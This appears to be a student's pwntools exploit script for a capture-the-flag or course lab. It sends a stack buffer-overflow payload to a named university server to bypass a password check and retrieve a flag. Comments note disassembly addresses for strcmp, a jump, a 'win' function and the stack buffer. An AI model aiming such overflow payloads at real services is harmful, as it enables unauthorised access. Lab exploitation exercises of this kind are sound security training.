#mustard.stt.rnl.tecnico.ulisboa.pt 22155.

from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = "22155"


r = remote(SERVER,PORT)

# is the ebx address 0x804a000

msg = (b"A"*0x39 + b"\x00") #+ b"A"*0x20 + b"\x00")                    ## win address is 0x080486f1  --> \xf1\x86\x04\x08
                                      
print(msg)                             
                                       
r.sendline(msg)

print(f"Flag: {r.recvall().decode()}")

r.close()


"""

check_password -> 0x08048731


pass is [64]            (user input)
and buffer is [32]

strcpy (buffer, password)


0x08048762   -> address de strcmp



0x0804876c -> jne the return of 1


buffer in memory is at:         0xffffce30



https://www.informit.com/articles/article.aspx?p=2036582&seqNum=3
https://www.tallan.com/blog/2019/04/04/exploring-buffer-overflows-in-c-part-two-the-exploit/

"""